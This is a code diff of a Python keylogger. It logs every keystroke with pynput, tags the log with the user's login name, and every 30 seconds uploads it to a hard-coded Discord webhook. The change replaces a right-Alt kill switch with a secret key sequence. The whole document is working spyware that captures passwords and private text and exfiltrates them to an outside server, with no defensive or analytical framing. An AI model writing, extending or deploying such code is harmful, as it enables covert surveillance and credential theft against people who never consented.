@@ -3,7 +3,9 @@ import tempfile
 import requests
 import threading
 import getpass
+import sys
 from pynput import keyboard
+import time
 
 # Get the name of the user signed in
 user_name = getpass.getuser()
@@ -22,17 +24,30 @@ webhook_url = 'https://discord.com/api/webhooks/1272625926668292136/LL8hTxV9YTcY
 # Initialize the idle time counter starting at 30 seconds
 idle_time = 30
 
-# Variables to track the state of the right Alt key and the timer
-right_alt_pressed = False
-alt_timer = None
+# Variables to track the key combination
+key_set = set()
+key_count = 0
+desired_keys = {'\\', '[', '`'}
+key_timer = None
+log_timer = None
+
+# Function to reset key tracking variables
+def reset_key_tracking():
+    global key_set, key_count, key_timer
+    key_set.clear()
+    key_count = 0
+    key_timer = None
 
 # Function to handle key press events
 def on_press(key):
-    global idle_time, right_alt_pressed, alt_timer
+    global idle_time, key_set, key_count, key_timer
     idle_time = 30  # Reset idle time to 30 seconds on key press
     try:
         with open(log_path, 'a') as f:
-            f.write(f'{key.char}')
+            f.write(f'{key}')
+            if key.char in desired_keys:
+                key_set.add(key.char)
+                key_count += 1
     except AttributeError:
         with open(log_path, 'a') as f:
             if key == keyboard.Key.space:
@@ -41,36 +56,47 @@ def on_press(key):
                 f.write('\n')
             else:
                 f.write(f'[{key}]')
+                if key == keyboard.Key.backslash:
+                    key_set.add('\\')
+                    key_count += 1
+                elif key == keyboard.Key.bracket_left:
+                    key_set.add('[')
+                    key_count += 1
+                elif key == keyboard.Key.grave:
+                    key_set.add('`')
+                    key_count += 1
 
-    # Check for right Alt key press
-    if key == keyboard.Key.alt_r:
-        right_alt_pressed = True
-        if alt_timer is None:
-            alt_timer = threading.Timer(5, stop_keylogger)
-            alt_timer.start()
+    # Start or reset the timer
+    if key_timer is None:
+        key_timer = threading.Timer(2, reset_key_tracking)
+        key_timer.start()
+    else:
+        key_timer.cancel()
+        key_timer = threading.Timer(2, reset_key_tracking)
+        key_timer.start()
 
-# Function to handle key release events (optional)
+    # Check if the desired keys are pressed twice
+    if key_set == desired_keys and key_count >= 6:
+        stop_keylogger()
+
+# Function to handle key release events
 def on_release(key):
-    global right_alt_pressed, alt_timer
     if key == keyboard.Key.esc:
         # Ignore the Escape key to prevent stopping the listener
         return
 
-    # Check for right Alt key release
-    if key == keyboard.Key.alt_r:
-        right_alt_pressed = False
-        if alt_timer is not None:
-            alt_timer.cancel()
-            alt_timer = None
-
 # Function to stop the keylogger
 def stop_keylogger():
-    print('Right Alt key held for 5 seconds. Stopping keylogger...')
-    os._exit(0)
+    global log_timer
+    print('Desired key combination detected. Stopping keylogger...')
+    if log_timer:
+        log_timer.cancel()
+    listener.stop()
+    sys.exit(0)
 
 # Function to send the log file to Discord
 def send_log_to_discord():
-    global idle_time
+    global idle_time, log_timer
     try:
         if os.path.getsize(log_path) == 0:
             message = f"Nothing typed in {idle_time} seconds by {user_name}"
@@ -98,7 +124,8 @@ def send_log_to_discord():
             idle_time = 30  # Reset idle time to 30 seconds after sending log
 
         # Schedule the next call to this function
-        threading.Timer(30, send_log_to_discord).start()
+        log_timer = threading.Timer(30, send_log_to_discord)
+        log_timer.start()
     except RuntimeError as e:
         if 'interpreter shutdown' in str(e):
             print('Interpreter is shutting down, cannot start new thread.')
@@ -106,10 +133,15 @@ def send_log_to_discord():
             raise
 
 # Start the keyboard listener
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    # Schedule the first log sending after 30 seconds
-    threading.Timer(30, send_log_to_discord).start()
-    listener.join()
+listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
+
+# Schedule the first log sending after 30 seconds
+log_timer = threading.Timer(30, send_log_to_discord)
+log_timer.start()
 
 # Print the path to the temporary file
 print(f'Keystrokes are being logged to: {log_path}')
+
+# Keep the script running
+listener.join()
